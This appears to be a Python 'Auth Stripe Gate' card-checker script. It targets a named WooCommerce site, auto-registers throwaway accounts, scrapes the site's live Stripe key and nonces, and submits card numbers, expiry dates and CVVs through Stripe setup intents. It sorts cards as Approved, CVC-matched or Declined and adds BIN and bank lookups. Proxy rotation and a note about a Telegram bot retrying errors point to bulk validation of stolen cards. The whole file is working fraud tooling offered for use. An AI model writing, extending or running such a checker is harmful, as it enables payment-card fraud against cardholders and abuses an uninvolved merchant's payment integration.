# ============================================================
#  Auth Stripe Gate — Ported from heater.py
#  Uses pre-authenticated WooCommerce account pool
#  Site: associationsmanagement.com
# ============================================================

import re
import time
import random
import uuid
import string
import requests
import logging
import threading

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

SITE_URL = "https://associationsmanagement.com"
ACCOUNT_URL = f"{SITE_URL}/my-account/"
APM_URL = f"{SITE_URL}/my-account/add-payment-method/"
PAYMENT_URL = f"{SITE_URL}/my-account/payment-methods/"
AJAX_URL = f"{SITE_URL}/wp-admin/admin-ajax.php"

ULTRA_HEADERS = {
    'authority': 'associationsmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

# ============================================================
#  BIN cache — avoids hammering BIN APIs on mass checks
# ============================================================
_bin_cache = {}
_bin_cache_lock = threading.Lock()


def _get_bin_info(bin6):
    """Multi-API BIN lookup with in-memory cache."""
    bin6 = bin6.replace(" ", "")[:6]

    with _bin_cache_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]

    apis = [
        (f"https://api.voidex.dev/api/bin?bin={bin6}", "voidex"),
        (f"https://binsapi.vercel.app/api/bin/{bin6}", "binsapi"),
        (f"https://bins.antipublic.cc/bins/{bin6}", "antipublic"),
        (f"https://lookup.binlist.net/{bin6}", "binlist"),
    ]

    for api_url, src in apis:
        try:
            headers = {"Accept": "application/json"}
            if src == "binlist":
                headers["Accept-Version"] = "3"
            r = requests.get(api_url, timeout=6, headers=headers)
            if r.status_code != 200:
                continue
            data = r.json()

            # Normalize across different API shapes
            brand = (
                data.get('scheme') or data.get('brand') or
                data.get('Brand') or data.get('cardBrand') or 'N/A'
            )
            if isinstance(brand, str):
                brand = brand.upper()
            else:
                brand = 'N/A'

            bank_raw = data.get('bank')
            if isinstance(bank_raw, dict):
                bank = bank_raw.get('name', 'N/A')
            elif isinstance(bank_raw, str):
                bank = bank_raw
            else:
                bank = data.get('Bank') or data.get('issuer') or 'N/A'
            bank = bank.upper() if isinstance(bank, str) else 'N/A'

            country_raw = data.get('country')
            if isinstance(country_raw, dict):
                country = country_raw.get('name', 'N/A')
                emoji = country_raw.get('emoji', '')
            elif isinstance(country_raw, str):
                country = country_raw
                emoji = data.get('emoji', '')
            else:
                country = data.get('Country') or 'N/A'
                emoji = data.get('emoji', '')
            country = country.upper() if isinstance(country, str) else 'N/A'
            if not emoji:
                emoji = ''

            if brand != 'N/A' or bank != 'N/A':
                result = {"brand": brand, "bank": bank, "country": country, "emoji": emoji}
                with _bin_cache_lock:
                    _bin_cache[bin6] = result
                return result
        except Exception:
            continue

    fallback = {"brand": "N/A", "bank": "N/A", "country": "N/A", "emoji": ""}
    with _bin_cache_lock:
        _bin_cache[bin6] = fallback
    return fallback


def _generate_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"


def _auto_register(scraper):
    """Auto-register a fresh account on the site and navigate to add-payment-method."""
    try:
        r_page = scraper.get(ACCOUNT_URL, timeout=20)
        if r_page.status_code != 200:
            return None, f"Site HTTP {r_page.status_code}"

        reg_match = re.search(r'id="woocommerce-register-nonce".*?value="(.*?)"', r_page.text)
        if not reg_match:
            return None, "Register nonce not found"

        email = _generate_email()
        reg_data = {
            'email': email,
            'email_2': '',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': APM_URL,
            'wc_order_attribution_session_start_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_session_pages': '1',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': ULTRA_HEADERS['user-agent'],
            'woocommerce-register-nonce': reg_match.group(1),
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }

        scraper.post(ACCOUNT_URL, params={'action': 'register'}, data=reg_data, timeout=20)
        scraper.get(PAYMENT_URL, timeout=15)
        r_apm = scraper.get(APM_URL, timeout=15)
        return r_apm, None
    except Exception as e:
        return None, str(e)[:80]


def _process_card(cc, mm, yy, cvv, proxy_dict=None):
    """Stripe auth check — auto-registers fresh account each time."""
    try:
        yy_full = f"20{yy[-2:]}" if len(yy) <= 2 else yy

        if cloudscraper:
            scraper = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'android', 'mobile': True}
            )
        else:
            scraper = requests.Session()

        if proxy_dict:
            scraper.proxies.update(proxy_dict)

        scraper.headers.update(ULTRA_HEADERS)

        # Step 1: Auto-register and load add-payment-method page
        try:
            r_page, reg_err = _auto_register(scraper)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
            return {"status": "ConnError", "response": str(e)[:80]}

        if not r_page:
            if reg_err and any(k in reg_err for k in ["Max retries", "Timeout", "Connection"]):
                return {"status": "ConnError", "response": reg_err}
            return {"status": "Error", "response": reg_err or "Registration failed"}

        if r_page.status_code == 429:
            return {"status": "ConnError", "response": "Rate limited (429)"}
        if r_page.status_code == 503:
            return {"status": "ConnError", "response": "Service unavailable (503)"}
        if r_page.status_code != 200:
            return {"status": "Error", "response": f"Site HTTP {r_page.status_code}"}

        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text)
        if not pk_match:
            return {"status": "Error", "response": "Stripe key not found"}
        pk_live = pk_match.group(0)

        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text)
        if not nonce_match:
            return {"status": "Error", "response": "Setup nonce not found"}
        addnonce = nonce_match.group(1)

        time.sleep(random.uniform(0.3, 0.8))

        # Step 2: Create payment method on Stripe (DIRECT — no proxy needed)
        stripe_session = requests.Session()
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ULTRA_HEADERS['user-agent'],
        }

        rand_name = ''.join(random.choice(string.ascii_uppercase) + ''.join(random.choices(string.ascii_lowercase, k=random.randint(3,7))) for _ in range(2))
        stripe_payload = (
            f'type=card&card[number]={cc}&card[cvc]={cvv}'
            f'&card[exp_year]={yy_full}&card[exp_month]={mm}'
            f'&billing_details[name]={rand_name.replace(" ", "+")}'
            f'&billing_details[address][postal_code]=10001'
            f'&key={pk_live}'
            f'&muid={str(uuid.uuid4())}'
            f'&sid={str(uuid.uuid4())}'
            f'&guid={str(uuid.uuid4())}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={random.randint(90000, 150000)}'
        )

        try:
            r_stripe = stripe_session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers, data=stripe_payload, timeout=12
            )
        except Exception as e:
            return {"status": "ConnError", "response": f"Stripe API: {str(e)[:60]}"}

        stripe_json = r_stripe.json()

        if 'id' not in stripe_json:
            err = stripe_json.get('error', {}).get('message', 'Radar Block')
            return {"status": "Declined", "response": err[:120]}

        pm_id = stripe_json['id']

        # Step 3: Confirm setup intent via WooCommerce AJAX
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }

        try:
            r_ajax = scraper.post(AJAX_URL, data=ajax_data, timeout=20)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
            return {"status": "ConnError", "response": str(e)[:80]}

        ajax_text = r_ajax.text.lower()

        if '"success":true' in ajax_text or 'insufficient_funds' in ajax_text:
            if 'insufficient_funds' in ajax_text:
                return {"status": "Approved", "response": "Approved (Insufficient Funds) ✅"}
            return {"status": "Approved", "response": "Payment Method Added ✅"}

        if 'incorrect_cvc' in ajax_text:
            return {"status": "Approved", "response": "CVC Matched ✅"}

        reason = re.search(r'message":"(.*?)"', r_ajax.text)
        return {"status": "Declined", "response": (reason.group(1) if reason else "Rejected")[:120]}

    except Exception as e:
        err_str = str(e)[:80]
        # Classify connection-type errors
        conn_keywords = ["Max retries", "ConnectionPool", "ConnectionError",
                         "Timeout", "Connection refused", "Connection reset",
                         "SSLError", "RemoteDisconnected"]
        if any(k in err_str for k in conn_keywords):
            return {"status": "ConnError", "response": err_str}
        return {"status": "Error", "response": err_str}


def check_card(cc_line, proxy_dict=None):
    """Public entry point. cc_line: CC|MM|YY|CVV"""
    start = time.time()
    parts = cc_line.strip().split('|')
    if len(parts) != 4:
        return "Error | Invalid format (CC|MM|YY|CVV)"

    cc, mm, yy, cvv = [p.strip() for p in parts]
    result = _process_card(cc, mm, yy, cvv, proxy_dict)
    elapsed = time.time() - start

    status = result.get("status", "Error")
    response = result.get("response", "Unknown")

    # Connection errors — return special marker for tg_bot to retry with different proxy
    if status == "ConnError":
        return f"ConnError | {response}"

    # Only look up BIN for real results (not errors)
    bin_info = _get_bin_info(cc[:6])

    if status == "Approved":
        return (
            f"Approved | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Stripe Auth\n"
            f"BIN: {bin_info['brand']} - {bin_info['country']} {bin_info['emoji']}\n"
            f"Bank: {bin_info['bank']}\n"
            f"Time: {elapsed:.1f}s"
        )
    elif status == "Declined":
        return (
            f"Declined | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Stripe Auth\n"
            f"BIN: {bin_info['brand']} - {bin_info['country']} {bin_info['emoji']}\n"
            f"Time: {elapsed:.1f}s"
        )
    else:
        return f"Error | {response}"


def probe_site():
    """Health check for the auth gate."""
    try:
        r = requests.get(
            APM_URL,
            headers={"User-Agent": ULTRA_HEADERS['user-agent']},
            timeout=10, allow_redirects=True,
        )
        alive = r.status_code == 200 and 'stripe' in r.text.lower()
        return alive, f"HTTP {r.status_code}" + (" | Stripe key found" if alive else " | No Stripe key")
    except Exception as e:
        return False, str(e)[:60]
